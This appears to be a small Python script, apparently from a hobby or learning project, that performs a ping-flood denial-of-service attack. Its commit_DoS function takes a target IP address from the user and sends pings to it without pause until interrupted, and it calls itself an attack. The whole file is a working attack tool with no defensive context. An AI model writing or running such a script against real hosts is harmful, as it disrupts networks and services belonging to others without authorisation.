import pythonping
from Helper import get_ip_from_user


def commit_DoS(ip: str = None) -> None:
    if ip is None:
        ip = get_ip_from_user()

    print("Beginning attack, press CTRL+C at any moment to stop.")
    try:
        while True:
            # By setting the timeout to 0, we can continuously send ping messages
            # without waiting for the response, as we don't care about it.
            pythonping.ping(ip, verbose=False, timeout=0)
    except (KeyboardInterrupt, InterruptedError):
        print("\nAttack Terminated.")
    except BaseException:
        print("An exception occurred, abandoning attack.")


def main():
    commit_DoS()


if __name__ == '__main__':
    main()
